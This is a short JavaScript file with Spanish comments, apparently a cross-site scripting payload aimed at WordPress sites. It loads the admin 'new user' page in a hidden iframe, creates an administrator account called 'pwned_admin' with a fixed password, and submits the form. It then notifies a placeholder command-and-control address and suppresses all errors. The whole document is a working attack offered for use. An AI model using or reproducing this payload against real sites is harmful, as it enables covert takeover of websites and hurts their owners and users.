++++++ File

(function() {
// 1. Cargar la página de crear usuario en un iframe
const iframe = document.createElement('iframe');
iframe.style.display = 'none';
iframe.src = '/wp-admin/user-new.php';
document.body.appendChild(iframe);

iframe.onload = function() {
    try {
        const doc = iframe.contentDocument;

        // 2. Rellenar los campos del formulario
        doc.querySelector('#user_login').value = 'pwned_admin';
        doc.querySelector('#email').value = 'pwned@example.com';
        doc.querySelector('#pass1').value = 'P@ssw0rd123!';
        doc.querySelector('#pass2').value = 'P@ssw0rd123!';

        // 3. Seleccionar el rol de Administrador
        const roleSelect = doc.querySelector('#role');
        if (roleSelect) {
            roleSelect.value = 'administrator';
        }

        // 4. Buscar y hacer clic en el botón de crear usuario
        const submitButton = doc.querySelector('#createusersub');
        if (submitButton) {
            submitButton.click();
            // 5. (Opcional) Notificar a tu servidor C2 que el usuario fue creado
            new Image().src = 'http://<TU-IP>:8000/log?type=new_user&data=created';
		return;
        }
    } catch(e) {
        // Manejar errores silenciosamente
    }
};
})();

